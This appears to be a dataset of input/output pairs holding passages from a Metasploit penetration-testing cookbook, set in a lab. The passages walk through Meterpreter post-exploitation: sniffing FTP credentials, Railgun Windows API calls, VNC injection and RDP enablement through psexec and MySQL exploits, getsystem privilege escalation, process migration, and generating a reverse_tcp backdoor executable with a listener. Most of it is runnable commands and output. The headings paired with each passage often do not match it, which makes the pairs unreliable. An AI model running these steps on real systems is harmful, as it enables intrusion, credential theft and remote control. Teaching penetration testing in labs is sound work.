    "output": "Meterpreter Chapter 4\nLoading framework plugins\nMeterpreter allows us to use several Meterpreter extensions, which provide us with\nenhanced features, such as the ability to execute PowerShell and Python commands, create\ninteractive PowerShell prompts, perform LAN attacks, sniff traffic, and much more.\nHow to do it...\n1. In this recipe, we will start by loading the PowerShell extension with the load\npowershell command and have a look at which commands were added to our\nMeterpreter session using the help command:\nmeterpreter > load powershell\nLoading extension powershell...Success.\nmeterpreter > help powershell\nPowershell Commands\n===================\nCommand Description\n------- -----------\npowershell_execute Execute a Powershell command string\npowershell_import Import a PS1 script or .NET Assembly DLL\npowershell_shell Create an interactive Powershell prompt\nmeterpreter >\n2. The first command we will check is the powershell_execute command, which\nallows us to execute PowerShell commands:\nmeterpreter > powershell_execute $PSVersionTable\n[+] Command execution completed:\nName Value\n---- -----\nCLRVersion 2.0.50727.5420\nBuildVersion 6.1.7601.17514\nPSVersion 2.0\nWSManStackVersion. 2.0\nPSCompatibleVersions {1.0, 2.0}\nSerializationVersion 1.1.0.1\nPSRemotingProtocolVersion 2.1\n[ 169 ]\nMeterpreter Chapter 4\nAs you can see, using the powershell_execute command, we can execute\nPowerShell commands as if we were at the PowerShell prompt.\n3. We can even use multiple PowerShell commands by placing them within quotes,\nas in the following example, where we use PowerShell to get a list of all the users\nin the domain:\nmeterpreter > powershell_execute \"Get-WmiObject Win32_UserDesktop |\nSelect-Object Element\"\n[+] Command execution completed:\nElement\n-------\n\\\\VAGRANT-2008R2\\root\\cimv2:Win32_UserAccount.Domain=\"VAGRANT-2008R\n2\",Name=\"Administrator\"\n\\\\VAGRANT-2008R2\\root\\cimv2:Win32_UserAccount.Domain=\"VAGRANT-2008R\n2\",Name=\"anakin_skywalker\"\n\\\\VAGRANT-2008R2\\root\\cimv2:Win32_UserAccount.Domain=\"VAGRANT-2008R\n2\",Name=\"artoo_detoo\"\n...\n\\\\VAGRANT-2008R2\\root\\cimv2:Win32_UserAccount.Domain=\"VAGRANT-2008R\n2\",Name=\"vagrant\"\n4. By loading the sniffer extension, we can start a network sniffer on the target\nmachine:\nmeterpreter > load sniffer\nLoading extension sniffer...Success.\nmeterpreter > help sniffer\nSniffer Commands\n================\nCommand Description\n------- -----------\nsniffer_dump Retrieve captured packet data to PCAP file\nsniffer_interfaces Enumerate all sniffable network interfaces\nsniffer_release Free captured packets on a specific interface\ninstead of downloading them\nsniffer_start Start packet capture on a specific interface\nsniffer_stats View statistics of an active capture\nsniffer_stop Stop packet capture on a specific interface\n[ 170 ]\nMeterpreter Chapter 4\n5. Before we begin capturing packets, we will first enumerate the available\ninterfaces using the sniffer_interfaces command:\nmeterpreter > sniffer_interfaces\n1 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true\ndhcp:false wifi:false )\n2 - 'Intel(R) PRO/1000 MT Desktop Adapter' ( type:4294967295 mtu:0\nusable:false dhcp:false wifi:false )\n3 - 'Intel(R) PRO/1000 MT Network Connection' ( type:0 mtu:1514\nusable:true dhcp:false wifi:false )\n4 - 'Intel(R) PRO/1000 MT Network Connection' ( type:0 mtu:1514\nusable:true dhcp:true wifi:false )\n6. Then, we will start sniffing on the third interface using the sniffer_start,\nfollowed by the interface ID:\nmeterpreter > sniffer_start 3\n[*] Capture started on interface 3 (50000 packet buffer)\n7. To generate some traffic, we will log in to the Metasploitable 3 machine, open a\ncommand prompt and FTP to the Metasploitable 2 machine, using the username\nuser and the password user:\nThen, we will stop the sniffer using the sniffer_stop 3 command:\nmeterpreter > sniffer_stop 3\n[*] Capture stopped on interface 3\n[*] There are 53 packets (4561 bytes) remaining\n[*] Download or release them using 'sniffer_dump' or\n'sniffer_release'\n[ 171 ]\nMeterpreter Chapter 4\nDownload the PCAP using the sniffer_dump 3 command:\nmeterpreter > sniffer_dump 3 dump.pcap\n[*] Flushing packet capture buffer for interface 3...\n[*] Flushed 53 packets (5621 bytes)\n[*] Downloaded 100% (5621/5621)...\n[*] Download completed, converting to PCAP...\n[*] PCAP file written to dump.pcap\nNow that we have the PCAP file, we can use tcpdump, a packet analyzer\ncommand-line tool, to display the PCAP contents, with -nn so it doesn't convert\naddresses or ports, A to print each packet in ASCII, and r to read from the PCAP\nfile:\nroot@kali:~# tcpdump -nnAr dump.pcap port 21\nreading from file dump.pcap, link-type EN10MB (Ethernet)\n11:07:41.000000 IP 192.168.216.10.50255 > 192.168.216.129.21: Flags\n[S], seq 4124208382, win 8192, options [mss 1460,nop,wscale\n0,nop,nop,sackOK], length 0\nE..4..@........\n.....O....l....... .2...............\n...snip...\n11:07:43.000000 IP 192.168.216.10.50255 > 192.168.216.129.21: Flags\n[P.], seq 1:12, ack 21, win 8172, length 11: FTP: USER user\nE..3..@........\n.....O....l.g...P...2...USER user\n...snip...\n11:07:44.000000 IP 192.168.216.10.50255 > 192.168.216.129.21: Flags\n[P.], seq 12:23, ack 55, win 8138, length 11: FTP: PASS user\nE..3..@........\n.....O....m\ng...P...2...PASS user\nLooking at the output, we can see that we were able to capture the FTP credentials\nfrom the connection between the Metasploitable 3 and Metasploitable 2 machines.\nThis is the reason why you should use clear text protocols, such as FTP and Telnet.\n[ 172 ]"
  },
  {
    "input": "How to do it...",
    "output": "Meterpreter Chapter 4\nMeterpreter API and mixins\nIn the previous two chapters, we learned extensively about using Meterpreter as a potential.\nYou might have realized the important role of Meterpreter to make our penetration task\neasier and faster. Now, from this recipe, we will move ahead and discuss some advanced\nconcepts related to Meterpreter. We will dive deeper into the core of Metasploit to\nunderstand how Meterpreter scripts function and how we can build our own scripts.\nFrom a penetration tester's point of view, it is essential to know how to implement our own\nscripting techniques so as to fulfill the needs of the scenario. There can be situations when\nyou have to perform tasks where Meterpreter may not be enough to solve your task, so you\ncan't sit back. This is where developing our own scripts and modules come in handy. So,\nlet's start with the recipe. In this recipe, we will discuss the Meterpreter API and some\nimportant mixins, and then in later recipes, we will code our own Meterpreter scripts.\nGetting ready\nThe Meterpreter API can be helpful for programmers to implement their own scripts during\npenetration testing. As the entire Metasploit framework is built using Ruby\nlanguage, experience with Ruby programming can enhance your penetration experience\nwith Metasploit. We will be dealing with Ruby scripts in the next few recipes, so some\nformer Ruby programming experience will be required. If you have a basic understanding\nof Ruby and other scripting languages, then it will be easy for you to understand the\nconcepts.\nHow to do it...\n1. Let's start by launching an interactive Ruby shell with Meterpreter in our\nMetasploitable 3 target machine session:\nmeterpreter > irb\n[*] Starting IRB shell\n[*] The \"client\" variable holds the meterpreter client\n>>\n[ 173 ]"
  },
  {
    "input": "How it works...",
    "output": "Meterpreter Chapter 4\n2. Now that we are in the Ruby shell, we can execute our Ruby scripts. Let's start\nwith a basic addition of two numbers:\n>> 1+1\n=> 2\n3. Our shell is working fine and can interpret the statements. Let's use the\nframework object and display information about our session:\n>> framework\n=> #<Framework (2 sessions, 0 jobs, 0 plugins, postgresql database\nactive)>\n>> framework.sessions\n=> {3=>#<Session:meterpreter 192.168.216.10:49469 (192.168.216.10)\n\"NT AUTHORITY\\SYSTEM @ VAGRANT-2008R2\">, 4=>#<Session:meterpreter\n192.168.216.10:49470 (192.168.216.10) \"NT AUTHORITY\\SYSTEM @\nVAGRANT-2008R2\">}\n>>\n4. Use client to display information about our target machine:\n>> client\n=> #<Session:meterpreter 192.168.216.10:49470 (192.168.216.10) \"NT\nAUTHORITY\\SYSTEM @ VAGRANT-2008R2\">\nHow it works...\nLet's look at some print API calls, which will be useful to us while writing Meterpreter\nscripts:\nprint_line(\"message\"): This call will print the output and add a carriage\nreturn at the end.\nprint_status(\"message\"): This call is used most often in the scripting\nlanguage. It will provide a carriage return and prints the status of whatever is\nexecuting with a [*] prefixed at the beginning:\n>> print_status(\"HackingAlert\")\n[*] HackingAlert\n=> nil\n[ 174 ]"
  },
  {
    "input": "Railgun—converting Ruby into a weapon",
    "output": "Meterpreter Chapter 4\nprint_good(\"message\"): This call is used to provide a result of any operation.\nThe message is displayed with a [+] prefixed at the beginning, indicating that\nthe action is successful:\n>> print_good(\"HackingAlert\")\n[+] HackingAlert\n=> nil\nprint_error(\"message\"): This call is used to display an error message that\nmay occur during script execution. The message is displayed with a [-] prefixed\nat the beginning of the error message:\n>> print_error(\"HackingAlert\")\n[-] HackingAlert\n=> nil\nThe reason why I discussed these different print calls is that they are widely used while\nwriting Meterpreter scripts in respective situations. You can find documentation related to\nthe Meterpreter API in /usr/share/metasploit-framework/documentation. Go\nthrough them in order to have a clear and detailed understanding. You can also refer\nto /usr/share/metasploit-framework/lib/rex/post/meterpreter, where you can\nfind many scripts related to the Meterpreter API.\nWithin these scripts are the various Meterpreter cores, desktop interactions, privileged\noperations, and many more commands. Review these scripts to become intimately familiar\nwith how Meterpreter operates within a compromised system.\nRailgun—converting Ruby into a weapon\nIn the previous recipe, we saw the use of the Meterpreter API to run Ruby scripts. Let's take\nthat a step further. Suppose we want to make remote API calls on the victim machine; what\nis the simplest method? Railgun is the obvious answer. It is a Meterpreter extension that\nallows an attacker to call DLL functions directly. Most often, it is used to make calls to the\nWindows API, but we can call any DLL on the victim's machine.\n[ 175 ]"
  },
  {
    "input": "How to do it...",
    "output": "Meterpreter Chapter 4\nGetting ready\nTo start using Railgun, we will require an active Meterpreter session on our target machine.\nTo start the Ruby interpreter, we will use the irb command, as discussed in the previous\nrecipe:\nmeterpreter > irb\n[*] Starting IRB shell\n[*] The \"client\" variable holds the meterpreter client\n>>\nHow to do it...\nBefore we move on to calling DLLs, let's first see what the essential steps to follow are in\norder to get the best out of Railgun:\n1. Identify the function(s) you wish to call.\n2. Locate the function on https:/​/​msdn.​microsoft.​com/​en-​us/​library/\naa383749(v=​vs.​85).​aspx.\n3. Check the library (DLL) in which the function is located (for example,\nkernel32.dll). The selected library function can be\ncalled client.railgun.dll_name. function_name(arg1, arg2, ...).\n4. The Windows MSDN library can be used to identify useful DLLs and functions to\ncall on the target machine.\n5. Let's use the client.sys.config.sysinfo API call to gather information on\nthe target:\n>> client.sys.config.sysinfo\n=> {\"Computer\"=>\"VAGRANT-2008R2\", \"OS\"=>\"Windows 2008 R2 (Build\n7601, Service Pack 1).\", \"Architecture\"=>\"x64\", \"System\nLanguage\"=>\"en_US\", \"Domain\"=>\"WORKGROUP\", \"Logged On Users\"=>2}\n6. If we just want the OS version, we can\nuse client.sys.config.sysinfo['OS']:\n>> client.sys.config.sysinfo['OS']\n=> \"Windows 2008 R2 (Build 7601, Service Pack 1).\"\n[ 176 ]"
  },
  {
    "input": "Adding DLL and function definitions to Railgun",
    "output": "Meterpreter Chapter 4\nUsing Railgun can be a very powerful and exciting experience. You can practice your own\ncalls and scripts to analyze the outputs. However, what if the DLL or the function you want\nto call is not a part of the Railgun definition? In that case, Railgun also provides you with\nthe flexibility to add your own functions and DLL to Railgun. We will deal with this in our\nnext recipe.\nHow it works...\nRailgun is an extension for Meterpreter that allows us to make calls to a Windows API\nwithout the need to compile our own DLL. Railgun can be used to make remote DLL calls\nto the compromised target. Remote DLL calls are an important process in penetration\ntesting, as they give us the command over the compromised target to execute any system\ninstruction with full privilege.\nThere's more...\nRailgun currently supports 10 different Windows API DLLs. You can find their definitions\nin the following folder: /usr/share/metasploit-\nframework/lib/rex/post/meterpreter/extensions/stdapi/railgun/def.\nAdding DLL and function definitions to\nRailgun\nIn the previous recipe, we focused on calling Windows API DLLs through Railgun. In this\nrecipe, we will focus on adding our own DLL and function definitions to Railgun. In order\nto do this, we should have an understanding of Windows DLLs. The Railgun\ndocumentation found at http:/​/​www.​rubydoc.​info/​search/​github/​rapid7/​metasploit-\nframework?​q=​Railgun can be helpful in giving you a quick idea about different Windows\nconstants that can be used while adding function definitions.\n[ 177 ]"
  },
  {
    "input": "How to do it...",
    "output": "Meterpreter Chapter 4\nHow to do it...\nAdding a new DLL definition to Railgun is an easy task. Suppose you want to add a DLL\nthat ships with Windows, but is not present in your Railgun; you can create a DLL\ndefinition under /usr/share/metasploit-\nframework/lib/rex/post/meterpreter/extensions/stdapi/railgun/def, select\nthe Linux, macOS, or Windows operating system folder, and name it def_dllname.rb.\nThe following template should demonstrate how a DLL is defined:\n# -*- coding: binary -*-\nmodule Rex\nmodule Post\nmodule Meterpreter\nmodule Extensions\nmodule Stdapi\nmodule Railgun\nmodule Def\nclass Def_somedll\ndef self.create_dll(dll_path = 'somedll')\ndll = DLL.new(dll_path, ApiConstants.manager)\n# 1st argument = Name of the function\n# 2nd argument = Return value's data type\n# 3rd argument = An array of parameters\ndll.add_function('SomeFunction', 'DWORD',[\n[\"DWORD\",\"hwnd\",\"in\"]\n])\nreturn dll\nend\nend\nend; end; end; end; end; end; end\n1. For this recipe, first we need to create a backup of the\noriginal def_shell32.rb Railgun DLL definition so we can write our own:\nroot@kali:~# cd /usr/share/metasploit-\nframework/lib/rex/post/meterpreter/extensions/stdapi/railgun/def/wi\nndows\nroot@kali:/usr/share/metasploit-\nframework/lib/rex/post/meterpreter/extensions/stdapi/railgun/def/wi\nndows# mv def_shell32.rb def_shell32.rb.bak\n[ 178 ]"
  },
  {
    "input": "How it works...",
    "output": "Meterpreter Chapter 4\n2. To write the DLL definition, we will start by specifying the modules used:\n# -*- coding: binary -*-\nmodule Rex\nmodule Post\nmodule Meterpreter\nmodule Extensions\nmodule Stdapi\nmodule Railgun\nmodule Def\n3. Then, the class and the location of the DLL:\nclass Def_windows_shell32\ndef self.create_library(constant_manager, library_path = 'shell32')\ndll = Library.new(library_path, constant_manager)\nSaving this code as def_shell32.dll will create a Railgun definition for\nshell32. dll.\n4. The next step is to add functions to the DLL definition. If you take a look at the\ndef_ shell32.dll script in Metasploit, you will see that the IsUserAnAdmin\nfunction is already added to it:\ndll.add_function('IsUserAnAdmin', 'BOOL', [])\nThe function simply returns a Boolean of true or false, depending upon the\ncondition. Similarly, we can add our own function definition in shell32.dll.\nHow it works...\nTo list the available functions for the shell32.dll DLL definition, type the following on\nthe Meterpreter session:\nmeterpreter > irb\n[*] Starting IRB shell\n[*] The \"client\" variable holds the meterpreter client\n>> session.railgun.shell32.functions\n=> {\"IsUserAnAdmin\"=>#\n[ 179 ]"
  },
  {
    "input": "Getting ready",
    "output": "Meterpreter Chapter 4\n<Rex::Post::Meterpreter::Extensions::Stdapi::Railgun::LibraryFunction:0x005\n60acbbe91d8 @return_type=\"BOOL\", @params=[], @remote_name=\"IsUserAnAdmin\",\n@calling_conv=\"stdcall\">}\n>>\nAs you can see, now we have the IsUserAnAdmin function available.\nSo, let's call the IsUserAnAdmin function from shell32.dll and analyze the output:\n>> client.railgun.shell32.IsUserAnAdmin\n=> {\"GetLastError\"=>0, \"ErrorMessage\"=>\"The operation completed\nsuccessfully.\", \"return\"=>true}\nThe function returned true, indicating that our session is running as the system admin.\nRailgun provides us with the flexibility to easily perform those tasks which are not present\nin the form of modules. So, we are not just limited to those scripts and modules that the\nframework provides us with; in fact, now we can make calls on-demand.\nThis was a short demonstration of using Railgun as a powerful tool to call Windows APIs,\ndepending on your needs. You can look for various useful Windows API calls in the MSDN\nlibrary, and add them into Railgun to enhance the functionality of your framework. It can\nbe used to call any DLL that is residing on the target machine. In the next recipe, we will\nmove on and analyze and write our own Meterpreter scripts.\nInjecting the VNC server remotely\nThe Virtual Network Computing (VNC) is a graphical desktop sharing system that uses\nthe Remote Frame Buffer (RFB) protocol to remotely control another computer.\nWe can inject a VNC server remotely using the Metasploit payload for the VNC injection. In\nthis recipe, we will learn how to inject the VNC server remotely.\nGetting ready\nThe VNC viewer must be installed on the host system to see the VNC session thrown by the\ntarget system. In this recipe, we will use the VNC viewer, which is already installed in Kali\nLinux.\n[ 180 ]"
  },
  {
    "input": "How to do it...",
    "output": "Meterpreter Chapter 4\nHow to do it...\nWe will use the Microsoft Windows Authenticated User Code Execution exploit module\nwith the windows/vncinject/reverse_tcp payload for injecting the VNC server\nremotely:\nmsf > use exploit/windows/smb/psexec\nmsf exploit(psexec) > set SMBUSER Administrator\nSMBUSER => Administrator\nmsf exploit(psexec) > set SMBPASS vagrant\nSMBPASS => vagrant\nmsf exploit(psexec) > set RHOST 192.168.216.10\nRHOST => 192.168.216.10\nmsf exploit(psexec) > set PAYLOAD windows/vncinject/reverse_tcp\nPAYLOAD => windows/vncinject/reverse_tcp\nmsf exploit(psexec) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(psexec) > exploit\n...\n[-] 192.168.216.10:445 - Exploit aborted due to failure: unknown:\n192.168.216.10:445 - Unable to execute specified command: The SMB server\ndid not reply to our request\n[*] Exploit completed, but no session was created.\nmsf exploit(psexec) >\nNow, you should see a remote VNC session from the injected VNC DLL:\n[ 181 ]"
  },
  {
    "input": "How to do it...",
    "output": "Meterpreter Chapter 4\nEnabling Remote Desktop\nSome organizations may not allow VNC, and by using it in our payload, we could trigger\nsome alarms. This is one of the reasons why we should try to use the OS built-in tools, such\nas Remote Desktop.\nHow to do it...\n1. First, to do this recipe, we need to disable Remote Desktop on the target machine,\nMetasploitable 3, since it is enabled by default:\n[ 182 ]\nMeterpreter Chapter 4\n2. Then, to enable Remote Desktop, we first need to have a Meterpreter session on\nthe target machine. For this recipe, we can use the Oracle MySQL for Microsoft\nWindows Payload Execution, which takes advantage of the absence of common\nMySQL passwords:\nmsf > use windows/mysql/mysql_payload\nmsf exploit(mysql_payload) > set RHOST 192.168.216.10\nRHOST => 192.168.216.10\nmsf exploit(mysql_payload) > set PAYLOAD\nwindows/x64/meterpreter/reverse_tcp\nPAYLOAD => windows/x64/meterpreter/reverse_tcp\nmsf exploit(mysql_payload) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(mysql_payload) > exploit\n...\n[*] Sending stage (205379 bytes) to 192.168.216.10\n[*] 192.168.216.10:3306 - Command Stager progress - 100.00% done\n(12022/12022 bytes)\n[*] Meterpreter session 1 opened (192.168.216.5:4444 ->\n192.168.216.10:49778) at 2017-11-23 16:44:00 -0500\nmeterpreter >\n3. Now that we have a running session, we can enable Remote Desktop using the\nrun getgui Meterpreter script with the -e option. This will enable Remote\nDesktop and won't create a new user:\nmeterpreter > run getgui -e\n[!] Meterpreter scripts are deprecated. Try\npost/windows/manage/enable_rdp.\n[!] Example: run post/windows/manage/enable_rdp OPTION=value [...]\n[*] Windows Remote Desktop Configuration Meterpreter Script by\nDarkoperator\n[*] Carlos Perez carlos_perez@darkoperator.com\n[*] Enabling Remote Desktop\n[*] RDP is already enabled\n[*] Setting Terminal Services service startup mode\n[*] The Terminal Services service is not set to auto, changing it\nto auto ...\n[*] Opening port in local firewall if necessary\n[*] For cleanup use command: run multi_console_command -r\n/root/.msf4/logs/scripts/getgui/clean_up__20171123.4632.rc\nmeterpreter >\n[ 183 ]\nMeterpreter Chapter 4\n4. To connect via Remote Desktop, we can use the rdesktop command with the -\nu option to specify the username we want to connect with:\nrdesktop 192.168.216.10 -u Administrator\n[ 184 ]"
  },
  {
    "input": "How it works...",
    "output": "Meterpreter Chapter 4\nHow it works...\nIf you looked carefully at the output of the Meterpreter script command, you may have\nnoticed the warning stating that Meterpreter scripts are deprecated and that we should use\nthe post-exploitation module post/windows/manage/enable_rdp instead.\nSo, let's use the post-exploitation module and see how it works:\n1. In the Meterpreter session, we will use the background command to background\nthe session and go back to the Metasploit console:\nmeterpreter > background\n[*] Backgrounding session 1...\nmsf exploit(mysql_payload) >\n2. Then, we will use the use command to load\nthe post/windows/manage/enable_rdp post-exploitation module and take a\nlook at the options:\nmsf exploit(mysql_payload) > use post/windows/manage/enable_rdp\nmsf post(enable_rdp) > show options\nModule options (post/windows/manage/enable_rdp):\nName Current Setting Required Description\n---- --------------- -------- -----------\nENABLE true no Enable the RDP Service and Firewall Exception.\nFORWARD false no Forward remote port 3389 to local Port.\nLPORT 3389 no Local port to forward remote connection.\nPASSWORD no Password for the user created.\nSESSION yes The session to run this module on.\nUSERNAME no The username of the user to create.\nmsf post(enable_rdp) >\n[ 185 ]\nMeterpreter Chapter 4\n3. To enable Remote Desktop, we just need to set the SESSION to run the module on\nand type run:\nmsf post(enable_rdp) > set SESSION 1\nSESSION => 1\nmsf post(enable_rdp) > run\n[*] Enabling Remote Desktop\n[*] RDP is disabled; enabling it ...\n[*] Setting Terminal Services service startup mode\n[*] Terminal Services service is already set to auto\n[*] Opening port in local firewall if necessary\n[*] For cleanup execute Meterpreter resource file:\n/root/.msf4/loot/20171123170402_default_192.168.216.10_host.windows\n.cle_349771.txt\n[*] Post module execution completed\nmsf post(enable_rdp) >\nGreat! The module completed successfully; now, we can use the rdesktop\ncommand to access the target.\n[ 186 ]"
  },
  {
    "input": "Chapter 5: Post-Exploitation",
    "output": "5\nPost-Exploitation\nIn this chapter, we will cover the following recipes:\nPost-exploitation modules\nPrivilege escalation and process migration\nBypassing UAC\nDumping the contents of the SAM database\nPassing the hash\nIncognito attacks with Meterpreter\nUsing Mimikatz\nSetting up a persistence with backdoors\nBecoming TrustedInstaller\nBackdooring Windows binaries\nPivoting with Meterpreter\nPort forwarding with Meterpreter\nCredential harvesting\nEnumeration modules\nAutoroute and socks proxy server\nAnalyzing an existing post-exploitation module\nWriting a post-exploitation module"
  },
  {
    "input": "Getting ready",
    "output": "Post-Exploitation Chapter 5\nIntroduction\nWith more than three hundred post-exploitation modules, Metasploit is one of the best\nframeworks for penetration testing, covering every phase from information gathering to\npost-exploitation, and even reporting in the pro version.\nNow that you have learned how to exploit remote targets, this chapter will focus on\nprivilege escalation, persistence, grabbing credentials, and lateral movement.\nPost-exploitation modules\nAfter the evolution of the Metasploit Framework, Meterpreter scripts, which serve the\npurpose of automating post-exploitation tasks, were deprecated and replaced by post-\nexploitation modules, which provided a more stable and flexible way to automate post-\nexploitation tasks.\nGetting ready\nBecause we will be focusing on post-exploitation, every recipe in this chapter will start\nwithin a remote Meterperter session.\nTo ease the task of getting a remote session, you can use\nthe makerc command within the msfconsole to create a resource file that\nwill automate the exploitation of the target machine.\nTake, for example, the following resource file:\nroot@kali:~# cat psexec.rc\nuse exploit/windows/smb/psexec\nset RHOST 192.168.216.10\nset SMBUSER Administrator\nset SMBPASS vagrant\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.216.5\nexploit\n[ 188 ]"
  },
  {
    "input": "How to do it...",
    "output": "Post-Exploitation Chapter 5\nBy starting the msfconsole with the -r option followed by the path of the resource file, we\ncan get a remote session without any effort:\nroot@kali:~# msfconsole -qr psexec.rc\n...\n[*] Sending stage (205379 bytes) to 192.168.216.10\n[*] Meterpreter session 1 opened (192.168.216.5:4444 ->\n192.168.216.10:49327) at 2017-11-25 05:38:46 -0500\nmeterpreter >\nHow to do it...\n1. To start using post-exploitation modules, first we need to get a session on the\ntarget system. For that, you can use a resource file or manually exploit a\nvulnerability to get a Meterpreter session. Then, we will use the background\ncommand to go back to the msfconsole, where we can start exploring the\navailable post-exploitation modules:\nmeterpreter > background\n[*] Backgrounding session 1...\nmsf exploit(psexec) >\n2. Looking at the Metasploit structure, we can see that there are post-\nexploitation modules available for different target systems:\nroot@kali:~# ls /usr/share/metasploit-framework/modules/post\naix android cisco firefox hardware linux multi osx solaris windows\n3. These exploitation modules are categorized by the tasks performed:\nroot@kali:~# ls /usr/share/metasploit-\nframework/modules/post/windows/\ncapture escalate gather manage recon wlan\n[ 189 ]"
  },
  {
    "input": "How it works...",
    "output": "Post-Exploitation Chapter 5\n4. Within msfconsole, to list all the available post-exploitation modules, we can\ntype the use command followed by the word post, then hit the Tab key twice\nand type y to display all the possibilities:\nHow it works...\nNow, let's use a simple post-exploitation module and see how it works.\n1. We will start by using the Windows Gather Virtual Environment Detection post-\nexploitation gather module to determine whether the target is running inside a\nvirtual environment, and, if so, detect which type of hypervisor it is running on:\nmsf exploit(psexec) > use post/windows/gather/checkvm\nmsf post(checkvm) > show options\nModule options (post/windows/gather/checkvm):\nName Current Setting Required Description\n---- --------------- -------- -----------\nSESSION yes The session to run this\nmodule on.\n2. Before running a module, we should always check the available options, not only\nto verify the required options but to also customize the options to our target or\nneeds. Alternatively, while using simple modules, we can simply use the show\nmissing command to display the missing options:\nmsf post(checkvm) > show missing\nModule options (post/windows/gather/checkvm):\n[ 190 ]"
  },
  {
    "input": "How to do it...",
    "output": "Post-Exploitation Chapter 5\nName Current Setting Required Description\n---- --------------- -------- -----------\nSESSION yes The session to run this module on.\n3. By running the module, we can see it was able to determine the target was\nrunning on a virtual machine and detect that the hypervisor is VMware:\nmsf post(checkvm) > set SESSION 1\nSESSION => 1\nmsf post(checkvm) > run\n[*] Checking if VAGRANT-2008R2 is a Virtual Machine .....\n[+] This is a VMware Virtual Machine\n[*] Post module execution completed\nmsf post(checkvm) > Privilege escalation and process migration\nIn this recipe, we will focus on two very useful commands of Meterpreter. The first one is\nfor privilege escalation. This command is used to escalate the rights/authority on the target\nsystem. We may break in as a user who has less privilege to perform tasks on the system so\nwe can escalate our privilege to the system admin to perform our tasks without\ninterruption. The second command is for process migration. This command is used to\nmigrate from one process to another process without writing anything to the disk.\nHow to do it...\nTo escalate our privilege, Meterpreter provides us with the getsystem command. This\ncommand automatically starts looking out for various possible techniques by which the\nuser rights can be escalated to a higher level. Let's analyze different techniques used by the\ngetsystem command:\nmeterpreter > getsystem -h\nUsage: getsystem [options]\nAttempt to elevate your privilege to that of local system.\nOPTIONS:\n-h Help Banner.\n-t <opt> The technique to use. (Default to '0').\n0 : All techniques available\n1 : Named Pipe Impersonation (In Memory/Admin)\n2 : Named Pipe Impersonation (Dropper/Admin)\n3 : Token Duplication (In Memory/Admin)\n[ 191 ]"
  },
  {
    "input": "How it works...",
    "output": "Post-Exploitation Chapter 5\nHow it works...\nThere are three different techniques by which the getsystem command tries to escalate\nprivileges on the target. The default value, 0, tries for all the listed techniques unless a\nsuccessful attempt is made. Let's take a quick look at these escalation techniques.\nA named pipe is a mechanism that enables interprocess communication for applications to\noccur locally or remotely. The application that creates the pipe is known as the pipe server,\nand the application that connects to the pipe is known as the pipe client. Impersonation is a\nthread's ability to execute in a security context different than that of the process that owns\nthe thread. Impersonation enables the server thread to perform actions on behalf of the\nclient, but within the limits of the client's security context. Problems arise when the client\nhas more rights than the server. This scenario would create a privilege escalation attack\ncalled a named pipe impersonation escalation attack.\nNow that we have understood the various escalation techniques used by the getsystem\ncommand, our next step will be to execute the command on our target to see what happens.\nFirst, we will use the getuid command to check our current user ID, and then we will try\nto escalate our privilege by using the getsystem command:\nmeterpreter > getuid\nServer username: IE11WIN7\\IEUser\nmeterpreter > getsystem\n...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).\nmeterpreter >\nAs you can see, previously we were a less privileged user, and, after using the getsystem\ncommand, we escalated our privilege on to the system.\nThe next important Meterpreter command that we are going to discuss is the migrate\ncommand. We have used it in previous chapters, but let's talk a bit more about it. This\ncommand is used to migrate from one process context to another, which can be helpful in\nsituations where the current process which we have broken into might crash. For example,\nif we use a browser exploit to penetrate the system, the browser may hang after\nexploitation, and the user may close it. So, migrating to a stable system process can help us\nperform our penetration testing smoothly. We can migrate to any other active process by\nusing the process name or the ID.\n[ 192 ]"
  },
  {
    "input": "Getting ready",
    "output": "Post-Exploitation Chapter 5\nThe ps command can be used to identify all active processes along with their names and\nIDs. For example, if the ID of explorer.exe is 2804, we can migrate to explorer.exe by\nexecuting the following command:\nmeterpreter > migrate 2804\n[*] Migrating from 3072 to 2804...\n[*] Migration completed successfully.\nmeterpreter >\nOr, when automating Meterpreter scripts with AutoRunScript, we can simply use the\nprocess name:\nmeterpreter > migrate -N explorer.exe\n[*] Migrating from 1232 to 2804...\n[*] Migration completed successfully.\nmeterpreter >\nThese two Meterpreter commands are very handy and are used frequently during\npenetration testing. Their simplicity and high productivity make them optimal for usage.\nBypassing UAC\nMicrosoft User Account Control (UAC) is a component that uses Mandatory Integrity\nControl (MIC) to isolate running processes with different privileges, aiming to improve the\nsecurity of Windows. It tries to achieve this by limiting application software to standard\nuser privileges and prompts the administrator to increase or elevate those privileges.\nAlthough still used, UAC is inherently broken and can be trivially defeated.\nFor more information on how to defeat UAC, please refer to\nthe UACMe project available at https:/​/​github.​com/​hfiref0x/​UACME.\nGetting ready\nFor this recipe, we will target the Windows 7 machine. For that, we need to change the\nnetwork configuration of the virtual machine to NAT, so we can access the target from our\nKali Linux machine.\n[ 193 ]\nPost-Exploitation Chapter 5\nThen, to compromise the target, we will create a simple backdoor that we will copy to the\ntarget to get a Meterpreter session.\n1. To generate the backdoor, we will use a Windows Meterpreter reverse TCP\npayload and the generate command within the msfconsole to generate our\npayload. Before using the generate command, let's see the available options\nwith -h:\nmsf > use payload/windows/meterpreter/reverse_tcp\nmsf payload(reverse_tcp) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf payload(reverse_tcp) > generate -h\nUsage: generate [options]\nGenerates a payload.\nOPTIONS:\n-E Force encoding.\n-b <opt> The list of characters to avoid: '\\x00\\xff'\n-e <opt> The name of the encoder module to use.\n-f <opt> The output file name (otherwise stdout)\n-h Help banner.\n-i <opt> the number of encoding iterations.\n-k Keep the template executable functional.\n-o <opt> A comma separated list of options in VAR=VAL format.\n-p <opt> The Platform for output.\n-s <opt> NOP sled length.\n-t <opt> The output format:\n...\nmsf payload(reverse_tcp) >\n2. After setting the listening address with the LHOST option and looking at the\navailable options for the generate command, we will use the -t option for the\noutput format, in this example, exe, followed by the -f option for the output file\nname:\nmsf payload(reverse_tcp) > generate -t exe -f backdoor.exe\n[*] Writing 73802 bytes to backdoor.exe...\nmsf payload(reverse_tcp) >\n[ 194 ]\nPost-Exploitation Chapter 5\n3. Now that we have created the backdoor, we need to set up a listener to receive\nthe reverse shell. For that, we will use the Generic Payload Handler exploit\nmodule:\nmsf payload(reverse_tcp) > use exploit/multi/handler\nmsf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => 